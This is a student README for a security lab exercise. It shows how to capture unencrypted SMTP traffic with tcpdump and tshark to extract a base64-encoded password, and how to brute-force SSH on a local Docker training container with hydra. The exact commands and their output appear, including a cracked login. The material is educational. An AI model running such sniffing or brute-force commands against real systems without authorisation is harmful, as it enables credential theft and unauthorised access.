# Attack is the best defense

```bash
88                                88        88
88                                88        ""
88                                88
88,dPPYba,  ,adPPYYba,  ,adPPYba, 88   ,d8  88 8b,dPPYba,   ,adPPYb,d8
88P'    "8a ""     `Y8 a8"     "" 88 ,a8"   88 88P'   `"8a a8"    `Y88
88       88 ,adPPPPP88 8b         8888[     88 88       88 8b       88
88       88 88,    ,88 "8a,   ,aa 88`"Yba,  88 88       88 "8a,   ,d88
88       88 `"8bbdP"Y8  `"Ybbd8"' 88   `Y8a 88 88       88  `"YbbdP"Y8
                                                            aa,    ,88
                                                             "Y8bbdP"
```

# General

* Network basics
* Docker

# Environment

<!-- ubuntu -->
[![Ubuntu](https://img.shields.io/static/v1?label=&message=Ubuntu&color=E95420&logo=Ubuntu&logoColor=E95420&labelColor=2F333A)](https://ubuntu.com/) <!-- bash -->
[![Bash](https://img.shields.io/static/v1?label=&message=GNU%20Bash&color=4EAA25&logo=GNU%20Bash&logoColor=4EAA25&labelColor=2F333A)](https://www.gnu.org/software/bash/) <!-- vim -->
[![Vim](https://img.shields.io/static/v1?label=&message=Vim&color=019733&logo=Vim&logoColor=019733&labelColor=2F333A)](https://www.vim.org/) <!-- vs code -->
[![VS Code](https://img.shields.io/static/v1?label=&message=Visual%20Studio%20Code&color=5C2D91&logo=Visual%20Studio%20Code&logoColor=5C2D91&labelColor=2F333A)](https://code.visualstudio.com/)

* OS: ``ubuntu``, ``kali``
* Shell: ``bash``
* IDE: ``vim``, ``VS Code``
* ``ssh``
* ``tcpdump``
* ``hydra``
* ``telnet``
* ``docker``

> [tcpdump.org](https://www.tcpdump.org/)

## Sniffing unencrypted traffic

> Sniffing over ``ubuntu`` 20.04 LTS booting on Linux 4.26. generic
>
> Kali Linux: Kali GNU/Linux Rolling 2021.4
>
> sniffing unencrypted traffic and getting information out of it.
>
> export for wireshark
>
> convert from base64

> Terminal 1

```bash
┌──(ralex㉿xelar)-[/media/…/2a17a9fd-dea9-4940-b67e-2348aa63bb5f/ralexrivero/holberton-system_engineering-devops/attack_is_the_best_defense]
└─$ sudo tcpdump -s 0 -i eth0 -w capture.pcap
```

> Terminal 2

```bash
┌──(ralex㉿xelar)-[/media/…/2a17a9fd-dea9-4940-b67e-2348aa63bb5f/ralexrivero/h┌──(ralex㉿xelar)-[/media/…/2a17a9fd-dea9-4940-b67e-2348aa63bb5f/ralexrivero/holberton-system_engineering-devops/attack_is_the_best_defense]
└─$ ./user_authenticating_into_server
```

> After capturing the traffic

```bash
┌──(ralex㉿xelar)-[/media/…/2a17a9fd-dea9-4940-b67e-2348aa63bb5f/ralexrivero/holberton-system_engineering-devops/attack_is_the_best_defense]
└─$ tshark -z follow,tcp,ascii,0 -P -r capture.pcap | grep -i pass
   43  22.802363 192.168.0.101 → 167.89.115.18 SMTP 88 C: Pass: bXlwYXNzd29yZDk4OTgh
   45  22.988826 167.89.115.18 → 192.168.0.101 SMTP 118 S: 535 Authentication failed: Bad username / password
```

> Decode the password from base 64

## Brute attack force

Pull docker image

``docker pull sylvainkalache/264-1```

Run the image

```bash
ralex@ralex-nb:~$ docker run -p 2222:22 -d -ti sylvainkalache/264-1
f6e64ceecab2c913fac1a15f2f2f66669dac8fd6b8f9a563ae30810f19852719
```

```bash
ralex@ralex-nb:~$ docker ps
CONTAINER ID   IMAGE                  COMMAND                  CREATED              STATUS              PORTS                                   NAMES
f6e64ceecab2   sylvainkalache/264-1   "/bin/sh -c 'service…"   About a minute ago   Up About a minute   0.0.0.0:2222->22/tcp, :::2222->22/tcp   quizzical_curran
ralex@ralex-nb:~$
```

brute force docker with hydra

``hydra -l sylvain -P passlist.txt ssh://127.0.0.1:2222``

```bash
ralex@ralex-nb:/media/ralex/2a17a9fd-dea9-4940-b67e-2348aa63bb5f/hack$ hydra -l sylvain -P ignis-1M.txt ssh://127.0.0.1:2222
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-25 23:59:46
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1000000 login tries (l:1/p:1000000), ~62500 tries per task
[DATA] attacking ssh://127.0.0.1:2222/
[STATUS] 178.00 tries/min, 178 tries in 00:01h, 999824 to do in 93:37h, 16 active
[2222][ssh] host: 127.0.0.1   login: sylvain   password: password123
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-26 00:01:20
```

## Author

<!-- twitter -->
[![Twitter](https://img.shields.io/twitter/follow/ralex_uy?style=social)](https://twitter.com/ralex_uy) <!-- linkedin --> [![Linkedin](https://img.shields.io/badge/LinkedIn-+27K-blue?style=social&logo=linkedin)](https://www.linkedin.com/in/ronald-rivero/) <!-- github --> [![Github](https://img.shields.io/github/followers/ralexrivero?style=social)](https://github.com/ralexrivero/) <!-- vagrant --> [![Vagrant](https://img.shields.io/static/v1?label=&message=Vagrant%20Profile&color=1868F2&logo=vagrant&labelColor=2F333A)](https://app.vagrantup.com/ralexrivero) <!-- docker --> [![Docker](https://img.shields.io/static/v1?label=&message=Docker%20Profile&color=2496ED&logo=Docker&labelColor=2F333A)](https://hub.docker.com/u/ralexrivero)